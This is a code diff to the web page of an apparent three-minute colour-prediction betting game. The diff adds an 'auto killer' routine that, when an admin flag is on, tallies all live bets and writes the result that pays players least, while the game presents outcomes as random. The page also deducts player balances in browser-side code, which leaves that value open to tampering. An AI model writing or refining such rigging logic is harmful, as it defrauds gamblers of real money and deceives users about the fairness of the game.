@@ -166,11 +166,55 @@
                     if (snap.exists()) {
                         balance = parseFloat(snap.val().balance) || 0;
                         document.getElementById('user-balance').innerText = balance.toFixed(2);
-                        update(ref(db, 'users/' + user.uid), { lastSeen: Date.now() });
                     }
                 });
             } else { window.location.href = "login.html"; }
         });
+
+        // ================= AUTO KILLER LOGIC (3m) =================
+        async function runAutoKiller(mode, pid, timeLeft) {
+            // ৩ মিনিটের গেমে শেষ ১০ সেকেন্ডে কিলার অ্যাক্টিভেট হবে
+            if (timeLeft <= 10 && timeLeft >= 2) {
+                const dangerSnap = await get(ref(db, 'systemConfig/dangerStatus'));
+                if (dangerSnap.val() === "ON") {
+                    const resultSnap = await get(ref(db, `results/${mode}/${pid}`));
+                    if (!resultSnap.exists()) {
+                        const betSnap = await get(ref(db, `wingoBets/${mode}/${pid}`));
+                        let s = { G: 0, R: 0, Big: 0, Small: 0 };
+                        let nS = Array(10).fill(0);
+
+                        betSnap.forEach(child => {
+                            let b = child.val();
+                            if (b.select === 'Green') s.G += b.amount;
+                            else if (b.select === 'Red') s.R += b.amount;
+                            else if (b.select === 'Big') s.Big += b.amount;
+                            else if (b.select === 'Small') s.Small += b.amount;
+                            else if (!isNaN(b.select)) nS[parseInt(b.select)] += b.amount;
+                        });
+
+                        let winColor = (s.G <= s.R) ? "Green" : "Red";
+                        let winSize = (s.Big <= s.Small) ? "Big" : "Small";
+                        let targetNum = -1, minCash = Infinity;
+
+                        for (let i = 0; i <= 9; i++) {
+                            let isBig = i >= 5, isRed = (i % 2 === 0);
+                            let colorOk = (winColor === "Red" && isRed) || (winColor === "Green" && !isRed);
+                            let sizeOk = (winSize === "Big" && isBig) || (winSize === "Small" && !isBig);
+                            if (colorOk && sizeOk) {
+                                if (nS[i] <= minCash) { minCash = nS[i]; targetNum = i; }
+                            }
+                        }
+                        if (targetNum !== -1) {
+                            set(ref(db, `results/${mode}/${pid}`), {
+                                num: targetNum,
+                                cl: (targetNum == 0 || targetNum == 5) ? "Violet" : (targetNum % 2 == 0 ? "Red" : "Green"),
+                                sz: targetNum >= 5 ? "Big" : "Small"
+                            });
+                        }
+                    }
+                }
+            }
+        }
 
         function getResult(p) {
             let s = parseInt(p.toString().slice(-4));
@@ -186,21 +230,21 @@
             setInterval(async () => {
                 let now = new Date();
                 let totalSeconds = (now.getMinutes() * 60) + now.getSeconds();
-                let timeLeft = 180 - (totalSeconds % 180); // ৩ মিনিটের টাইমার
+                let timeLeft = 180 - (totalSeconds % 180);
                 
                 let min = Math.floor(timeLeft / 60);
                 let sec = timeLeft % 60;
                 document.getElementById('timer').innerText = `0${min}:${sec < 10 ? '0'+sec : sec}`;
                 
-                // ৩ মিনিটের পিরিয়ড আইডি ক্যালকুলেশন
                 let total3m = (now.getHours() * 20) + Math.floor(now.getMinutes() / 3);
                 let pid = now.getFullYear().toString() + (now.getMonth()+1).toString().padStart(2,'0') + now.getDate().toString().padStart(2,'0') + "3" + total3m.toString().padStart(4, '0');
                 
+                runAutoKiller("3m", pid, timeLeft);
+
                 if (currentP !== pid) {
                     if (currentP !== "") {
                         const adminSnap = await get(ref(db, `results/3m/${currentP}`));
                         let res = adminSnap.exists() ? adminSnap.val() : getResult(currentP);
-
                         gameHist3m.unshift({period: currentP, ...res});
                         if(gameHist3m.length > 100) gameHist3m.pop();
                         checkWinner(currentP, res);
@@ -253,14 +297,12 @@
         function updateUI() {
             document.getElementById('h-page-num').innerText = `${hP}/10`;
             document.getElementById('c-page-num').innerText = `${cP}/10`;
-
             let hHtml = "";
             gameHist3m.slice((hP-1)*10, hP*10).forEach(i => {
                 let c = i.cl==='Red'?'#ff5252':(i.cl==='Green'?'#1dcc70':'#b983ff');
                 hHtml += `<tr><td>${i.period.slice(-4)}</td><td style="color:${c}; font-weight:bold">${i.num}</td><td>${i.sz}</td><td><div style="width:10px;height:10px;border-radius:50%;background:${c};margin:auto"></div></td></tr>`;
             });
             document.getElementById('history-list').innerHTML = hHtml || '<tr><td colspan="4">No Data</td></tr>';
-
             let cHtml = "";
             gameHist3m.slice((cP-1)*10, cP*10).forEach(item => {
                 let dots = "";
@@ -271,7 +313,6 @@
                 cHtml += `<tr><td>${item.period.slice(-4)}</td><td>${dots}</td></tr>`;
             });
             document.getElementById('chart-list').innerHTML = cHtml;
-
             let myHtml = "";
             myBets3m.slice().reverse().slice(0, 10).forEach(b => {
                 let cl = b.status==='Win'?'#1dcc70':(b.status==='Loss'?'#ff5252':'#ffb84d');
@@ -298,21 +339,13 @@
         document.getElementById('confirmBtn').onclick = () => {
             let amt = parseFloat(document.getElementById('bet-amt').value);
             if(isNaN(amt) || amt <= 0 || balance < amt) return alert("Low Balance or Invalid Amount");
-            
             const user = auth.currentUser;
             update(ref(db, 'users/' + user.uid), { balance: balance - amt });
-            
             const betKey = push(ref(db, 'temp')).key;
             set(ref(db, `wingoBets/3m/${currentP}/${user.uid}_${betKey}`), {
-                uid: user.uid,
-                email: user.email || 'Anonymous',
-                select: selectedC,
-                choice: selectedC,
-                amount: amt,
-                period: currentP,
-                time: Date.now()
+                uid: user.uid, email: user.email || 'Anonymous',
+                select: selectedC, choice: selectedC, amount: amt, period: currentP, time: Date.now()
             });
-
             myBets3m.push({period: currentP, choice: selectedC, amount: amt, status: 'Pending'});
             localStorage.setItem('club_bets_3m', JSON.stringify(myBets3m));
             closeBet(); updateUI();
@@ -330,15 +363,16 @@
             runTimer(); updateUI();
         };
     </script>
+
     <script>
-  atOptions = {
-    'key' : 'c403443c624d3a0e64d71e89cd90306b',
-    'format' : 'iframe',
-    'height' : 50,
-    'width' : 320,
-    'params' : {}
-  };
-</script>
-<script src="https://www.highperformanceformat.com/c403443c624d3a0e64d71e89cd90306b/invoke.js"></script>
+      atOptions = {
+        'key' : 'c403443c624d3a0e64d71e89cd90306b',
+        'format' : 'iframe',
+        'height' : 50,
+        'width' : 320,
+        'params' : {}
+      };
+    </script>
+    <script src="https://www.highperformanceformat.com/c403443c624d3a0e64d71e89cd90306b/invoke.js"></script>
 </body>
 </html>
